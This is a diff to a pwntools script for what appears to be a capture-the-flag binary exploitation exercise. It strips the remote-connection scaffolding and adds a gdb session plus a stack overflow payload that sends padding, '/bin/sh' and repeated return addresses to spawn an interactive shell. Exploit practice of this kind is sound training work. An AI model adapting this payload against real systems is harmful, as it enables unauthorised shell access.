@@ -8,56 +8,38 @@ from pwn import *
 flag_regex = r"flag\{[^}]+\}"
 global_timeout = 5 #seconds
 
-#challenge-specific info
-host = 'offsec-chalbroker.osiris.cyber.nyu.edu'
-port = 1246
-netid='pk1898'
-
 do_remote = False
 binary_name = './inspector'
 
 #for doing local debugging
-is_local_dbg = False
+is_local_dbg = True
 gdb_script = '''
-c
+set pagination off
+set disassembly-flavor intel
+i proc mappings
+b*0x00400678
+b*0x00400672
+b main
 '''
 
-#universal flag finder, given a string
-def find_flag(input):
-    m = re.findall(flag_regex, input)
-    if(m != []):
-        return m[0]
-    else:
-        return None
 
 
-def solve(target):
-    print target.readline()
-    return None
+DATA = ''
+DATA += ('AAAAAAAA')
+DATA += ('/bin/sh ')
+DATA += p64(0x00400621)
+DATA += p64(0x00400621)
+DATA += p64(0x00400621)
+DATA += p64(0x00400621)
+DATA += p64(0x00400621)
 
 
-#universal target setup for remote-only
-def target():
-    if(do_remote):
-        r = remote(host, port)
-        r.sendline(netid)
-        r.recvline() # eat interstitial
-        return r
-    else:
-        if(is_local_dbg):
-            target = gdb.debug(binary_name, gdb_script)
-        else:
-            target = process(binary_name)
-        return target
 
-#scaffolding
-def main():
-    with target() as p:
-        flag = solve(p)
-    if(flag):
-        print "Challenge Solved: %s" % flag
-    else:
-        print "Challenge Not Solved"
 
-if __name__ == '__main__':
-    main()
+
+target = gdb.debug(binary_name, gdb_script)
+print target.read()
+print DATA
+target.sendline(DATA)
+target.interactive()
+
